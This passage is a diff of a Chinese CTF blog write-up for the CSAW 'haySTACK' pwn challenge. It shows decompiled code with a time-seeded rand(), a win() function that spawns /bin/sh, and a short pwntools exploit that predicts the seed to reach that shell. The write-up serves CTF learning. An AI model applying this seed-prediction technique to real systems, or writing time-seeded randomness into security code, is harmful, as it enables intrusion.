&#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      fwrite(<span class="hljs-string">&quot;I don\&#x27;t have that many haystacks!\n&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x22</span>,<span class="hljs-built_in">stdout</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (local_44 == <span class="hljs-number">2</span>) &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I\&#x27;m out of time. Thanks for trying...&quot;</span>);<br>      <span class="hljs-keyword">goto</span> LAB_00101429;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let\&#x27;s try again!&quot;</span>);<br>    local_44 = local_44 + <span class="hljs-number">1</span>;<br>  &#125; <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> );<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="challenge"><a href="#challenge" class="headerlink" title="challenge:"></a>challenge:</h3><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">challenge</span><span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-built_in">stack</span>)</span>
+&#123;
+  <span class="hljs-type">int</span> iVar1;
+  <span class="hljs-type">int</span> iVar2;
+  <span class="hljs-type">long</span> in_FS_OFFSET;
+  <span class="hljs-type">int</span> local_44;
+  undefined8 local_38;
+  undefined8 local_30;
+  undefined8 local_28;
+  undefined8 local_20;
+  <span class="hljs-type">long</span> local_10;
+  
+  local_10 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);
+  iVar1 = random_value();
+  *(undefined4 *)(<span class="hljs-built_in">stack</span> + (<span class="hljs-type">long</span>)iVar1 * <span class="hljs-number">4</span>) = <span class="hljs-number">0x1337</span>;
+  local_38 = <span class="hljs-number">0</span>;
+  local_30 = <span class="hljs-number">0</span>;
+  local_28 = <span class="hljs-number">0</span>;
+  local_20 = <span class="hljs-number">0</span>;
+  local_44 = <span class="hljs-number">0</span>;
+  <span class="hljs-keyword">do</span> &#123;
+    <span class="hljs-keyword">if</span> (<span class="hljs-number">2</span> &lt; local_44) &#123;
+LAB_00101429:
+      <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;
+                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>
+        __stack_chk_fail();
+      &#125;
+      <span class="hljs-keyword">return</span>;
+    &#125;
+    fwrite(<span class="hljs-string">&quot;Which haystack do you want to check?\n&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x25</span>,<span class="hljs-built_in">stdout</span>);
+    fgets((<span class="hljs-type">char</span> *)&amp;local_38,<span class="hljs-number">0x20</span>,<span class="hljs-built_in">stdin</span>);
+    iVar2 = atoi((<span class="hljs-type">char</span> *)&amp;local_38);
+    <span class="hljs-keyword">if</span> (iVar2 &lt; <span class="hljs-number">0x100001</span>) &#123;
+      <span class="hljs-keyword">if</span> (iVar2 == iVar1) &#123;
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hey you found a needle! And its number is 0x%08x! That\&#x27;s it!\n&quot;</span>,
+               (ulong)*(uint *)(<span class="hljs-built_in">stack</span> + (<span class="hljs-type">long</span>)iVar2 * <span class="hljs-number">4</span>));
+        win();
+      &#125;
+      <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hey, you found a needle, but it\&#x27;s number is 0x%08x. I don\&#x27;t like that one\n&quot;</span>,
+               (ulong)*(uint *)(<span class="hljs-built_in">stack</span> + (<span class="hljs-type">long</span>)iVar2 * <span class="hljs-number">4</span>));
+        <span class="hljs-keyword">if</span> (local_44 == <span class="hljs-number">0</span>) &#123;
+          <span class="hljs-built_in">puts</span>(
+              <span class="hljs-string">&quot;Shoot, I forgot to tell you that I hid a needle in every stack. But I only have onefavorite needle&quot;</span>
+              );
+        &#125;
+        <span class="hljs-keyword">else</span> &#123;
+          <span class="hljs-keyword">if</span> (local_44 == <span class="hljs-number">1</span>) &#123;
+            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Did I mention I\&#x27;m in a hurry? I need you to find it on your next guess&quot;</span>);
+          &#125;
+        &#125;
+      &#125;
+    &#125;
+    <span class="hljs-keyword">else</span> &#123;
+      fwrite(<span class="hljs-string">&quot;I don\&#x27;t have that many haystacks!\n&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x22</span>,<span class="hljs-built_in">stdout</span>);
+    &#125;
+    <span class="hljs-keyword">if</span> (local_44 == <span class="hljs-number">2</span>) &#123;
+      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;I\&#x27;m out of time. Thanks for trying...&quot;</span>);
+      <span class="hljs-keyword">goto</span> LAB_00101429;
+    &#125;
+    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let\&#x27;s try again!&quot;</span>);
+    local_44 = local_44 + <span class="hljs-number">1</span>;
+  &#125; <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> );
+&#125;</code></pre>
 <p>这里观察到让iVar1与iVar2值相等可进入后门函数win</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">iVar1 = random_value();<br>*(undefined4 *)(<span class="hljs-built_in">stack</span> + (<span class="hljs-type">long</span>)iVar1 * <span class="hljs-number">4</span>) = <span class="hljs-number">0x1337</span>;<br></code></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">ulong <span class="hljs-title function_">random_value</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">long</span> lVar1;<br>  <span class="hljs-type">int</span> iVar2;<br>  <span class="hljs-type">time_t</span> tVar3;<br>  <span class="hljs-type">long</span> in_FS_OFFSET;<br>  <br>  lVar1 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);<br>  tVar3 = time((<span class="hljs-type">time_t</span> *)<span class="hljs-number">0x0</span>);<br>  srand((uint)tVar3);<br>  iVar2 = rand();<br>  <span class="hljs-keyword">if</span> (lVar1 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>    __stack_chk_fail();<br>  &#125;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">long</span>)iVar2 % <span class="hljs-number">0x100000</span> &amp; <span class="hljs-number">0xffffffff</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">win</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v0; <span class="hljs-comment">// ST08_8</span><br><br>  v0 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">return</span> v0 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure>
+<pre><code class="hljs c">iVar1 = random_value();
+*(undefined4 *)(<span class="hljs-built_in">stack</span> + (<span class="hljs-type">long</span>)iVar1 * <span class="hljs-number">4</span>) = <span class="hljs-number">0x1337</span>;</code></pre>
+<pre><code class="hljs c">ulong <span class="hljs-title function_">random_value</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
+&#123;
+  <span class="hljs-type">long</span> lVar1;
+  <span class="hljs-type">int</span> iVar2;
+  <span class="hljs-type">time_t</span> tVar3;
+  <span class="hljs-type">long</span> in_FS_OFFSET;
+  
+  lVar1 = *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);
+  tVar3 = time((<span class="hljs-type">time_t</span> *)<span class="hljs-number">0x0</span>);
+  srand((uint)tVar3);
+  iVar2 = rand();
+  <span class="hljs-keyword">if</span> (lVar1 != *(<span class="hljs-type">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;
+                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>
+    __stack_chk_fail();
+  &#125;
+  <span class="hljs-keyword">return</span> (<span class="hljs-type">long</span>)iVar2 % <span class="hljs-number">0x100000</span> &amp; <span class="hljs-number">0xffffffff</span>;
+&#125;</code></pre>
+<pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">win</span><span class="hljs-params">()</span>
+&#123;
+  <span class="hljs-type">unsigned</span> __int64 v0; <span class="hljs-comment">// ST08_8</span>
+
+  v0 = __readfsqword(<span class="hljs-number">0x28</span>u);
+  system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);
+  <span class="hljs-keyword">return</span> v0 - __readfsqword(<span class="hljs-number">0x28</span>u);
+&#125;</code></pre>
 <p>Ivar1为0至0x100000的随机值，其对应的数组的值被设置为0x1337</p>
 <p>从上面的图片中可得知ivar1是由当前时间初始化得到的随机值，我们通过from ctypes import CDLL可在python程序中使用C语言函数，产生相同的时间种子，从而得到相同的随机数</p>
 <p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/image-20210922173335323.png" alt="image-20210922173335323"></p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>最后的exp如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import *<br>from ctypes import CDLL<br><br>io=process(<span class="hljs-string">&#x27;./haySTACK&#x27;</span>)<br><br>libc=CDLL(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br>now=<span class="hljs-type">int</span>(time.time())<br>libc.srand(now)<br><br>guess=libc.rand()%<span class="hljs-number">0x100000</span><br><br>io.recvuntil(<span class="hljs-string">&#x27;Which haystack do you want to check?\n&#x27;</span>)<br>io.sendline(str(guess))<br>io.interactive()<br></code></pre></td></tr></table></figure>
+<pre><code class="hljs c">from pwn import *
+from ctypes import CDLL
+
+io=process(<span class="hljs-string">&#x27;./haySTACK&#x27;</span>)
+
+libc=CDLL(<span class="hljs-string">&quot;libc.so.6&quot;</span>)
+now=<span class="hljs-type">int</span>(time.time())
+libc.srand(now)
+
+guess=libc.rand()%<span class="hljs-number">0x100000</span>
+
+io.recvuntil(<span class="hljs-string">&#x27;Which haystack do you want to check?\n&#x27;</span>)
+io.sendline(str(guess))
+io.interactive()</code></pre>
 </article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://wysyrg.github.io">chuwei</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://wysyrg.github.io/2022/08/06/csaw/">http://wysyrg.github.io/2022/08/06/csaw/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://wysyrg.github.io" target="_blank">chuwei'blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/973119.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/08/06/dl-runtime-resolve/"><img class="prev-cover" src="/img/973119.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">ret2dl-resolve</div></div></a></div><div class="next-post pull-right"><a href="/2022/08/06/ciscn_2019/"><img class="next-cover" src="/img/973119.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ciscn</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Alien-math"><span class="toc-number">1.</span> <span class="toc-text">Alien_math:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">main函数：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#second-question"><span class="toc-number">1.2.</span> <span class="toc-text">second_question:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#final-question"><span class="toc-number">1.3.</span> <span class="toc-text">final_question:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">EXP：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HayHACK"><span class="toc-number">2.</span> <span class="toc-text">HayHACK</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main-gt-sub143f"><span class="toc-number">2.1.</span> <span class="toc-text">main()-&gt;sub143f():</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#challenge"><span class="toc-number">2.2.</span> <span class="toc-text">challenge:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By chuwei</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
